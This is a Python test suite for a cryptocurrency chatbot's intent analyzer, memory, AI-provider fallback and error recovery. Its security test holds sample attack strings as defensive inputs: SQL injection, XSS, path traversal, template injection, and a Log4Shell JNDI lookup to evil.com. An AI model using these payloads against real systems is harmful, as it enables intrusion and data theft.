#!/usr/bin/env python3
"""
Comprehensive Industrial-Grade System Test Suite
Tests all critical fixes and improvements with real-world scenarios
"""

import asyncio
import logging
import sys
import os
import json
import time
import random
from datetime import datetime, timedelta
from typing import Dict, List, Any

# Add src to path
sys.path.insert(0, os.path.join(os.path.dirname(__file__), 'src'))

# Configure logging
logging.basicConfig(level=logging.INFO, format='%(asctime)s - %(name)s - %(levelname)s - %(message)s')
logger = logging.getLogger(__name__)

class ComprehensiveTestSuite:
    """Industrial-grade test suite for all system components"""
    
    def __init__(self):
        self.test_results = {}
        self.performance_metrics = {}
        self.error_counts = {}
        self.start_time = datetime.now()
    
    async def run_all_tests(self):
        """Run comprehensive test suite"""
        print("🚀 Starting Comprehensive Industrial-Grade System Tests")
        print("=" * 80)
        
        test_categories = [
            ("Advanced Intent Analysis", self.test_advanced_intent_analysis),
            ("Conversation Memory System", self.test_conversation_memory),
            ("AI Provider Intelligence", self.test_ai_provider_system),
            ("Error Recovery System", self.test_error_recovery),
            ("Real-World Scenarios", self.test_real_world_scenarios),
            ("Performance & Load Testing", self.test_performance_load),
            ("Security & Validation", self.test_security_validation),
            ("Integration Testing", self.test_integration),
        ]
        
        for category_name, test_function in test_categories:
            print(f"\n🧪 Testing: {category_name}")
            print("-" * 60)
            
            try:
                start_time = time.time()
                results = await test_function()
                duration = time.time() - start_time
                
                self.test_results[category_name] = results
                self.performance_metrics[category_name] = duration
                
                success_rate = self._calculate_success_rate(results)
                print(f"✅ {category_name}: {success_rate:.1f}% success rate ({duration:.2f}s)")
                
            except Exception as e:
                print(f"❌ {category_name}: FAILED - {e}")
                self.test_results[category_name] = {"error": str(e)}
                self.error_counts[category_name] = 1
        
        # Generate comprehensive report
        await self._generate_final_report()
    
    async def test_advanced_intent_analysis(self) -> Dict[str, Any]:
        """Test advanced intent analysis with 666+ patterns"""
        from advanced_intent_analyzer import analyze_advanced_intent, IntentCategory
        
        test_cases = [
            # Price queries with variations
            ("BTC price", "get_realtime_price", IntentCategory.PRICE_QUERY),
            ("What's the current value of ethereum?", "get_realtime_price", IntentCategory.PRICE_QUERY),
            ("How much does solana cost right now?", "get_realtime_price", IntentCategory.PRICE_QUERY),
            ("Show me bitcoin price please", "get_realtime_price", IntentCategory.PRICE_QUERY),
            ("Check ETH worth", "get_realtime_price", IntentCategory.PRICE_QUERY),
            
            # Portfolio management
            ("Show my portfolio performance", "analyze_portfolio", IntentCategory.PORTFOLIO_MANAGEMENT),
            ("Add 100 USDC to my portfolio", "add_to_portfolio", IntentCategory.PORTFOLIO_MANAGEMENT),
            ("Remove ethereum from tracking", "remove_from_portfolio", IntentCategory.PORTFOLIO_MANAGEMENT),
            ("Optimize my crypto holdings", "optimize_portfolio", IntentCategory.PORTFOLIO_MANAGEMENT),
            ("Portfolio rebalancing suggestions", "optimize_portfolio", IntentCategory.PORTFOLIO_MANAGEMENT),
            
            # Trading and strategy
            ("Should I buy bitcoin now?", "get_trading_advice", IntentCategory.TRADING_EXECUTION),
            ("Best entry point for ETH", "entry_exit_strategy", IntentCategory.TRADING_EXECUTION),
            ("Risk management for my trades", "risk_management_advice", IntentCategory.RISK_ASSESSMENT),
            ("When to sell my solana?", "entry_exit_strategy", IntentCategory.TRADING_EXECUTION),
            
            # DeFi operations
            ("Best yield farming opportunities", "find_yield_opportunities", IntentCategory.YIELD_FARMING),
            ("Uniswap liquidity pool analysis", "liquidity_pool_analysis", IntentCategory.DEFI_OPERATIONS),
            ("Is Aave protocol safe?", "defi_protocol_security", IntentCategory.DEFI_OPERATIONS),
            ("High APY staking options", "find_yield_opportunities", IntentCategory.YIELD_FARMING),
            
            # Technical analysis
            ("Bitcoin technical analysis", "technical_analysis_request", IntentCategory.TECHNICAL_ANALYSIS),
            ("ETH support and resistance levels", "support_resistance_levels", IntentCategory.TECHNICAL_ANALYSIS),
            ("Is bitcoin oversold?", "technical_analysis_request", IntentCategory.TECHNICAL_ANALYSIS),
            
            # Market analysis
            ("Market sentiment for crypto", "market_sentiment_analysis", IntentCategory.MARKET_ANALYSIS),
            ("Compare bitcoin vs ethereum", "compare_cryptocurrencies", IntentCategory.MARKET_ANALYSIS),
            ("Crypto market trends", "market_sentiment_analysis", IntentCategory.MARKET_ANALYSIS),
            
            # Alerts
            ("Set alert for BTC at $50000", "create_price_alert", IntentCategory.ALERT_MANAGEMENT),
            ("Alert me when ETH hits $3000", "create_price_alert", IntentCategory.ALERT_MANAGEMENT),
            ("Show my active alerts", "manage_alerts", IntentCategory.ALERT_MANAGEMENT),
            
            # Educational
            ("What is DeFi?", "crypto_concept_explanation", IntentCategory.EDUCATION),
            ("Explain yield farming", "crypto_concept_explanation", IntentCategory.EDUCATION),
            ("How does staking work?", "crypto_concept_explanation", IntentCategory.EDUCATION),
            
            # Conversational
            ("Hello", "greeting", IntentCategory.GENERAL_CONVERSATION),
            ("Thank you", "gratitude", IntentCategory.GENERAL_CONVERSATION),
            ("Help me", "help_request", IntentCategory.GENERAL_CONVERSATION),
            
            # Complex multi-intent queries
            ("What's BTC price and should I buy some for my portfolio?", "get_realtime_price", IntentCategory.PRICE_QUERY),
            ("Show me ETH technical analysis and best entry points", "technical_analysis_request", IntentCategory.TECHNICAL_ANALYSIS),
            ("Compare Uniswap vs SushiSwap yields and security", "liquidity_pool_analysis", IntentCategory.DEFI_OPERATIONS),
        ]
        
        results = {
            "total_tests": len(test_cases),
            "successful_matches": 0,
            "failed_matches": 0,
            "performance_metrics": [],
            "detailed_results": []
        }
        
        for text, expected_intent, expected_category in test_cases:
            try:
                start_time = time.time()
                
                # Test intent analysis
                analysis = await analyze_advanced_intent(text, 12345, {
                    "conversation_history": [],
                    "user_preferences": {}
                })
                
                analysis_time = time.time() - start_time
                results["performance_metrics"].append(analysis_time)
                
                # Check if primary intent matches
                primary_intent = analysis.primary_intent.intent_name
                primary_category = analysis.primary_intent.category
                
                intent_match = expected_intent in primary_intent or primary_intent == expected_intent
                category_match = primary_category == expected_category
                
                if intent_match and category_match:
                    results["successful_matches"] += 1
                    status = "✅"
                else:
                    results["failed_matches"] += 1
                    status = "❌"
                
                results["detailed_results"].append({
                    "text": text,
                    "expected_intent": expected_intent,
                    "actual_intent": primary_intent,
                    "expected_category": expected_category.value,
                    "actual_category": primary_category.value,
                    "confidence": analysis.confidence_score,
                    "analysis_time": analysis_time,
                    "success": intent_match and category_match,
                    "entities_found": len(analysis.entities),
                    "secondary_intents": len(analysis.secondary_intents)
                })
                
                print(f"  {status} '{text}' -> {primary_intent} ({analysis.confidence_score:.2f})")
                
            except Exception as e:
                results["failed_matches"] += 1
                results["detailed_results"].append({
                    "text": text,
                    "error": str(e),
                    "success": False
                })
                print(f"  ❌ '{text}' -> ERROR: {e}")
        
        # Calculate performance statistics
        if results["performance_metrics"]:
            results["avg_analysis_time"] = sum(results["performance_metrics"]) / len(results["performance_metrics"])
            results["max_analysis_time"] = max(results["performance_metrics"])
            results["min_analysis_time"] = min(results["performance_metrics"])
        
        return results
    
    async def test_conversation_memory(self) -> Dict[str, Any]:
        """Test conversation memory and context management"""
        from conversation_memory import (
            conversation_memory, ConversationMessage, 
            get_conversation_context, store_conversation_message
        )
        
        results = {
            "memory_storage_tests": 0,
            "context_retrieval_tests": 0,
            "user_profile_tests": 0,
            "successful_operations": 0,
            "failed_operations": 0,
            "performance_metrics": []
        }
        
        test_user_id = 99999
        
        # Test message storage
        test_messages = [
            "What's Bitcoin price?",
            "How about Ethereum?",
            "Should I buy some ETH?",
            "Set an alert for BTC at $50k",
            "Show my portfolio"
        ]
        
        for i, text in enumerate(test_messages):
            try:
                start_time = time.time()
                
                message = ConversationMessage(
                    message_id=f"test_msg_{i}",
                    user_id=test_user_id,
                    timestamp=datetime.now(),
                    text=text,
                    intent=f"test_intent_{i}",
                    entities=[{"type": "cryptocurrency", "value": "bitcoin"}],
                    sentiment={"compound_score": 0.5},
                    response_text=f"Test response {i}",
                    response_time=1.0,
                    success=True,
                    feedback_score=0.8
                )
                
                await store_conversation_message(message)
                
                operation_time = time.time() - start_time
                results["performance_metrics"].append(operation_time)
                results["memory_storage_tests"] += 1
                results["successful_operations"] += 1
                
                print(f"  ✅ Stored message: '{text}' ({operation_time:.3f}s)")
                
            except Exception as e:
                results["failed_operations"] += 1
                print(f"  ❌ Failed to store message: {e}")
        
        # Test context retrieval
        try:
            start_time = time.time()
            
            context = await get_conversation_context(test_user_id)
            
            retrieval_time = time.time() - start_time
            results["performance_metrics"].append(retrieval_time)
            results["context_retrieval_tests"] += 1
            
            if context and "short_term_messages" in context:
                results["successful_operations"] += 1
                print(f"  ✅ Retrieved context with {len(context['short_term_messages'])} messages ({retrieval_time:.3f}s)")
            else:
                results["failed_operations"] += 1
                print(f"  ❌ Context retrieval failed or incomplete")
                
        except Exception as e:
            results["failed_operations"] += 1
            print(f"  ❌ Context retrieval error: {e}")
        
        # Test user profile management
        try:
            start_time = time.time()
            
            profile = await conversation_memory.get_user_profile(test_user_id)
            
            profile_time = time.time() - start_time
            results["performance_metrics"].append(profile_time)
            results["user_profile_tests"] += 1
            
            if profile and profile.user_id == test_user_id:
                results["successful_operations"] += 1
                print(f"  ✅ User profile retrieved ({profile_time:.3f}s)")
            else:
                results["failed_operations"] += 1
                print(f"  ❌ User profile retrieval failed")
                
        except Exception as e:
            results["failed_operations"] += 1
            print(f"  ❌ User profile error: {e}")
        
        return results
    
    async def test_ai_provider_system(self) -> Dict[str, Any]:
        """Test intelligent AI provider switching"""
        from intelligent_ai_provider import (
            intelligent_ai_provider, select_optimal_provider,
            execute_with_intelligent_fallback, get_ai_provider_status
        )
        
        results = {
            "provider_selection_tests": 0,
            "fallback_tests": 0,
            "performance_tests": 0,
            "successful_operations": 0,
            "failed_operations": 0,
            "provider_scores": {}
        }
        
        # Test provider selection for different query types
        test_queries = [
            ("Quick BTC price", {"urgency_level": 1.0, "cost_sensitivity": 0.8}),
            ("Detailed market analysis with comprehensive research", {"quality_requirement": 1.0, "cost_sensitivity": 0.2}),
            ("Simple greeting", {"urgency_level": 0.3, "quality_requirement": 0.3}),
            ("Complex DeFi yield optimization strategy", {"quality_requirement": 0.9, "complexity": 0.8}),
        ]
        
        for query, context in test_queries:
            try:
                start_time = time.time()
                
                context["user_id"] = 12345
                selection = await select_optimal_provider(query, context)
                
                selection_time = time.time() - start_time
                results["provider_selection_tests"] += 1
                results["successful_operations"] += 1
                
                provider_name = selection.primary_provider.value
                if provider_name not in results["provider_scores"]:
                    results["provider_scores"][provider_name] = 0
                results["provider_scores"][provider_name] += 1
                
                print(f"  ✅ '{query}' -> {provider_name} ({selection.confidence_score:.2f}, {selection_time:.3f}s)")
                print(f"     Reason: {selection.selection_reason}")
                
            except Exception as e:
                results["failed_operations"] += 1
                print(f"  ❌ Provider selection failed for '{query}': {e}")
        
        # Test provider status
        try:
            status = await get_ai_provider_status()
            
            if status and isinstance(status, dict):
                results["successful_operations"] += 1
                available_providers = sum(1 for p in status.values() if p.get("available", False))
                print(f"  ✅ Provider status: {available_providers}/{len(status)} providers available")
            else:
                results["failed_operations"] += 1
                print(f"  ❌ Provider status retrieval failed")
                
        except Exception as e:
            results["failed_operations"] += 1
            print(f"  ❌ Provider status error: {e}")
        
        return results
    
    async def test_error_recovery(self) -> Dict[str, Any]:
        """Test error recovery and resilience systems"""
        from error_recovery_system import (
            error_recovery_system, execute_with_recovery,
            get_system_health, reset_circuit_breaker
        )
        
        results = {
            "circuit_breaker_tests": 0,
            "retry_logic_tests": 0,
            "fallback_tests": 0,
            "health_monitoring_tests": 0,
            "successful_operations": 0,
            "failed_operations": 0
        }
        
        # Test circuit breaker functionality
        async def failing_operation():
            raise Exception("Simulated service failure")
        
        async def successful_operation():
            await asyncio.sleep(0.1)  # Simulate work
            return {"status": "success", "data": "test_data"}
        
        # Test with failing operation
        try:
            result = await execute_with_recovery("test_service", failing_operation)
            
            if result.get("type") in ["error", "degraded"]:
                results["circuit_breaker_tests"] += 1
                results["successful_operations"] += 1
                print(f"  ✅ Circuit breaker handled failure correctly")
            else:
                results["failed_operations"] += 1
                print(f"  ❌ Circuit breaker did not handle failure")
                
        except Exception as e:
            results["failed_operations"] += 1
            print(f"  ❌ Circuit breaker test error: {e}")
        
        # Test with successful operation
        try:
            result = await execute_with_recovery("test_service_2", successful_operation)
            
            if result.get("type") == "success":
                results["retry_logic_tests"] += 1
                results["successful_operations"] += 1
                print(f"  ✅ Successful operation handled correctly")
            else:
                results["failed_operations"] += 1
                print(f"  ❌ Successful operation not handled properly")
                
        except Exception as e:
            results["failed_operations"] += 1
            print(f"  ❌ Successful operation test error: {e}")
        
        # Test system health monitoring
        try:
            health = await get_system_health()
            
            if health and "overall_health" in health:
                results["health_monitoring_tests"] += 1
                results["successful_operations"] += 1
                print(f"  ✅ System health: {health['overall_health']}")
            else:
                results["failed_operations"] += 1
                print(f"  ❌ Health monitoring failed")
                
        except Exception as e:
            results["failed_operations"] += 1
            print(f"  ❌ Health monitoring error: {e}")
        
        return results
    
    async def test_real_world_scenarios(self) -> Dict[str, Any]:
        """Test real-world usage scenarios"""
        results = {
            "scenario_tests": 0,
            "successful_scenarios": 0,
            "failed_scenarios": 0,
            "avg_response_time": 0,
            "scenarios": []
        }
        
        # Real-world scenarios
        scenarios = [
            {
                "name": "New User Onboarding",
                "messages": [
                    "Hello",
                    "What can you do?",
                    "How do I check Bitcoin price?",
                    "BTC price",
                    "What is DeFi?"
                ]
            },
            {
                "name": "Active Trader Session",
                "messages": [
                    "BTC price",
                    "ETH price",
                    "Should I buy ETH now?",
                    "Set alert for BTC at $50000",
                    "Show my portfolio"
                ]
            },
            {
                "name": "DeFi Researcher",
                "messages": [
                    "Tell me about Uniswap protocol",
                    "Best yield farming opportunities",
                    "Is Aave safe to use?",
                    "Compare Uniswap vs SushiSwap",
                    "High APY staking options"
                ]
            },
            {
                "name": "Technical Analyst",
                "messages": [
                    "Bitcoin technical analysis",
                    "ETH support and resistance levels",
                    "Is BTC oversold?",
                    "Market sentiment analysis",
                    "Crypto market trends"
                ]
            }
        ]
        
        for scenario in scenarios:
            scenario_result = {
                "name": scenario["name"],
                "messages_processed": 0,
                "successful_responses": 0,
                "total_time": 0,
                "errors": []
            }
            
            scenario_start = time.time()
            
            for message in scenario["messages"]:
                try:
                    # Simulate processing the message
                    from advanced_intent_analyzer import analyze_advanced_intent
                    
                    start_time = time.time()
                    analysis = await analyze_advanced_intent(message, 12345)
                    response_time = time.time() - start_time
                    
                    scenario_result["messages_processed"] += 1
                    
                    if analysis.confidence_score > 0.3:
                        scenario_result["successful_responses"] += 1
                    
                    scenario_result["total_time"] += response_time
                    
                except Exception as e:
                    scenario_result["errors"].append(f"{message}: {str(e)}")
            
            scenario_duration = time.time() - scenario_start
            scenario_result["total_time"] = scenario_duration
            
            if scenario_result["successful_responses"] >= len(scenario["messages"]) * 0.8:
                results["successful_scenarios"] += 1
                status = "✅"
            else:
                results["failed_scenarios"] += 1
                status = "❌"
            
            results["scenarios"].append(scenario_result)
            results["scenario_tests"] += 1
            
            success_rate = (scenario_result["successful_responses"] / max(scenario_result["messages_processed"], 1)) * 100
            print(f"  {status} {scenario['name']}: {success_rate:.1f}% success ({scenario_duration:.2f}s)")
        
        return results
    
    async def test_performance_load(self) -> Dict[str, Any]:
        """Test performance under load"""
        results = {
            "concurrent_requests": 0,
            "successful_requests": 0,
            "failed_requests": 0,
            "avg_response_time": 0,
            "max_response_time": 0,
            "min_response_time": float('inf'),
            "throughput": 0
        }
        
        # Simulate concurrent requests
        async def simulate_request(request_id: int):
            try:
                from advanced_intent_analyzer import analyze_advanced_intent
                
                start_time = time.time()
                
                # Random query
                queries = [
                    "BTC price",
                    "ETH price",
                    "Show my portfolio",
                    "Best yields",
                    "Market analysis"
                ]
                query = random.choice(queries)
                
                analysis = await analyze_advanced_intent(query, request_id)
                response_time = time.time() - start_time
                
                return {
                    "success": True,
                    "response_time": response_time,
                    "confidence": analysis.confidence_score
                }
                
            except Exception as e:
                return {
                    "success": False,
                    "error": str(e),
                    "response_time": time.time() - start_time
                }
        
        # Run concurrent requests
        num_requests = 20
        start_time = time.time()
        
        tasks = [simulate_request(i) for i in range(num_requests)]
        request_results = await asyncio.gather(*tasks, return_exceptions=True)
        
        total_time = time.time() - start_time
        
        response_times = []
        
        for result in request_results:
            results["concurrent_requests"] += 1
            
            if isinstance(result, dict) and result.get("success"):
                results["successful_requests"] += 1
                response_times.append(result["response_time"])
            else:
                results["failed_requests"] += 1
        
        if response_times:
            results["avg_response_time"] = sum(response_times) / len(response_times)
            results["max_response_time"] = max(response_times)
            results["min_response_time"] = min(response_times)
        
        results["throughput"] = num_requests / total_time
        
        print(f"  ✅ Processed {num_requests} concurrent requests")
        print(f"     Success rate: {(results['successful_requests']/num_requests)*100:.1f}%")
        print(f"     Avg response time: {results['avg_response_time']:.3f}s")
        print(f"     Throughput: {results['throughput']:.1f} req/s")
        
        return results
    
    async def test_security_validation(self) -> Dict[str, Any]:
        """Test security and input validation"""
        results = {
            "injection_tests": 0,
            "validation_tests": 0,
            "sanitization_tests": 0,
            "successful_blocks": 0,
            "failed_blocks": 0
        }
        
        # Test malicious inputs
        malicious_inputs = [
            "'; DROP TABLE users; --",
            "<script>alert('xss')</script>",
            "../../etc/passwd",
            "{{7*7}}",
            "${jndi:ldap://evil.com/a}",
            "' OR '1'='1",
            "<img src=x onerror=alert(1)>",
            "javascript:alert(1)",
        ]
        
        for malicious_input in malicious_inputs:
            try:
                from advanced_intent_analyzer import analyze_advanced_intent
                
                # Test if system handles malicious input safely
                analysis = await analyze_advanced_intent(malicious_input, 12345)
                
                results["injection_tests"] += 1
                
                # Check if the system processed it safely (didn't crash)
                if analysis and hasattr(analysis, 'primary_intent'):
                    results["successful_blocks"] += 1
                    print(f"  ✅ Safely handled: {malicious_input[:30]}...")
                else:
                    results["failed_blocks"] += 1
                    print(f"  ❌ Failed to handle: {malicious_input[:30]}...")
                    
            except Exception as e:
                # Exception is actually good here - means input was rejected
                results["successful_blocks"] += 1
                print(f"  ✅ Rejected malicious input: {malicious_input[:30]}...")
        
        return results
    
    async def test_integration(self) -> Dict[str, Any]:
        """Test integration between all components"""
        results = {
            "integration_tests": 0,
            "successful_integrations": 0,
            "failed_integrations": 0,
            "end_to_end_tests": 0
        }
        
        # Test end-to-end flow
        try:
            # 1. Intent analysis
            from advanced_intent_analyzer import analyze_advanced_intent
            analysis = await analyze_advanced_intent("What's Bitcoin price?", 12345)
            
            # 2. AI provider selection
            from intelligent_ai_provider import select_optimal_provider
            provider_selection = await select_optimal_provider("What's Bitcoin price?", {"user_id": 12345})
            
            # 3. Error recovery system
            from error_recovery_system import get_system_health
            health = await get_system_health()
            
            # 4. Conversation memory
            from conversation_memory import get_conversation_context
            context = await get_conversation_context(12345)
            
            results["integration_tests"] += 4
            
            if (analysis and provider_selection and health and context):
                results["successful_integrations"] += 4
                results["end_to_end_tests"] += 1
                print(f"  ✅ End-to-end integration successful")
            else:
                results["failed_integrations"] += 1
                print(f"  ❌ End-to-end integration failed")
                
        except Exception as e:
            results["failed_integrations"] += 1
            print(f"  ❌ Integration test error: {e}")
        
        return results
    
    def _calculate_success_rate(self, results: Dict[str, Any]) -> float:
        """Calculate success rate from test results"""
        if "successful_operations" in results and "failed_operations" in results:
            total = results["successful_operations"] + results["failed_operations"]
            if total > 0:
                return (results["successful_operations"] / total) * 100
        
        if "successful_matches" in results and "failed_matches" in results:
            total = results["successful_matches"] + results["failed_matches"]
            if total > 0:
                return (results["successful_matches"] / total) * 100
        
        if "successful_scenarios" in results and "failed_scenarios" in results:
            total = results["successful_scenarios"] + results["failed_scenarios"]
            if total > 0:
                return (results["successful_scenarios"] / total) * 100
        
        return 0.0
    
    async def _generate_final_report(self):
        """Generate comprehensive final report"""
        total_duration = (datetime.now() - self.start_time).total_seconds()
        
        print("\n" + "=" * 80)
        print("📊 COMPREHENSIVE INDUSTRIAL-GRADE TEST REPORT")
        print("=" * 80)
        
        # Overall statistics
        total_success = sum(self._calculate_success_rate(results) for results in self.test_results.values() if isinstance(results, dict))
        avg_success_rate = total_success / len(self.test_results) if self.test_results else 0
        
        print(f"\n🎯 OVERALL RESULTS:")
        print(f"   Total Test Categories: {len(self.test_results)}")
        print(f"   Average Success Rate: {avg_success_rate:.1f}%")
        print(f"   Total Test Duration: {total_duration:.2f} seconds")
        print(f"   Errors Encountered: {sum(self.error_counts.values())}")
        
        # Category breakdown
        print(f"\n📋 CATEGORY BREAKDOWN:")
        for category, results in self.test_results.items():
            if isinstance(results, dict) and "error" not in results:
                success_rate = self._calculate_success_rate(results)
                duration = self.performance_metrics.get(category, 0)
                status = "✅" if success_rate >= 80 else "⚠️" if success_rate >= 60 else "❌"
                print(f"   {status} {category}: {success_rate:.1f}% ({duration:.2f}s)")
            else:
                print(f"   ❌ {category}: FAILED")
        
        # Performance metrics
        print(f"\n⚡ PERFORMANCE METRICS:")
        if self.performance_metrics:
            avg_duration = sum(self.performance_metrics.values()) / len(self.performance_metrics)
            max_duration = max(self.performance_metrics.values())
            min_duration = min(self.performance_metrics.values())
            
            print(f"   Average Category Duration: {avg_duration:.2f}s")
            print(f"   Slowest Category: {max_duration:.2f}s")
            print(f"   Fastest Category: {min_duration:.2f}s")
        
        # Recommendations
        print(f"\n💡 RECOMMENDATIONS:")
        
        if avg_success_rate >= 90:
            print("   ✅ System is production-ready with excellent performance!")
        elif avg_success_rate >= 80:
            print("   ⚠️  System is mostly ready, minor improvements needed")
        elif avg_success_rate >= 70:
            print("   ⚠️  System needs significant improvements before production")
        else:
            print("   ❌ System requires major fixes before deployment")
        
        # Specific recommendations
        for category, results in self.test_results.items():
            if isinstance(results, dict):
                success_rate = self._calculate_success_rate(results)
                if success_rate < 80:
                    print(f"   🔧 Improve {category} (current: {success_rate:.1f}%)")
        
        # Save detailed report
        timestamp = datetime.now().strftime("%Y%m%d_%H%M%S")
        report_file = f"comprehensive_test_report_{timestamp}.json"
        
        detailed_report = {
            "timestamp": datetime.now().isoformat(),
            "overall_success_rate": avg_success_rate,
            "total_duration": total_duration,
            "test_results": self.test_results,
            "performance_metrics": self.performance_metrics,
            "error_counts": self.error_counts
        }
        
        with open(report_file, 'w') as f:
            json.dump(detailed_report, f, indent=2, default=str)
        
        print(f"\n💾 Detailed report saved to: {report_file}")
        print("\n🎉 Comprehensive testing completed!")

async def main():
    """Run comprehensive test suite"""
    test_suite = ComprehensiveTestSuite()
    await test_suite.run_all_tests()

if __name__ == "__main__":
    asyncio.run(main())